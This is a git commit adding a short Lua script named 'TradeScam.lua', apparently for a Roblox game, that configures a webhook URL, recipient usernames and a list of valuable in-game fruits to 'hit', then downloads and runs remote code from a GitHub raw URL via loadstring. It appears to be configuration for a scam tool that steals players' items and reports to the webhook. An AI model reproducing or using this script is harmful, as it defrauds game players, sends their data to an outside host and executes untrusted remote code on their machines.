8071c836a26d74ac1520ee1d22f1c17ec5676669
azuree <stewdaryn@gmail.com>
2025-04-21 20:03:59 -0400

    Create TradeScam.lua

---
+++ TradeScam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=b0N6YkdubmxNTkFOZXpZNTNjalNNdzpjWkZVMTNMaUNoanJzWnQyY2FReEVoNE56YWdpanIxOWhRUlliVnFXYjNublRCQTloYTBqaEtfck8yMExaY0FwUmktOFE1dmwwRmI2bnBubVl2TDkxbTJuS19jREN2QjhJXzlmRG9fWGp5aW9qcjM4YVBhMVNKU1Z3MS1aZkdCN3VMVENRc0pSN0pDVkU2YnF3WUNDXzg4clk4VW5TcXNGWlp5ZzFwZlRpV3c" -- << Your Webhook
+Usernames = {"NewAccountPokeMaster", "Shinobboyside"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gravity-Gravity", "Dragon-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
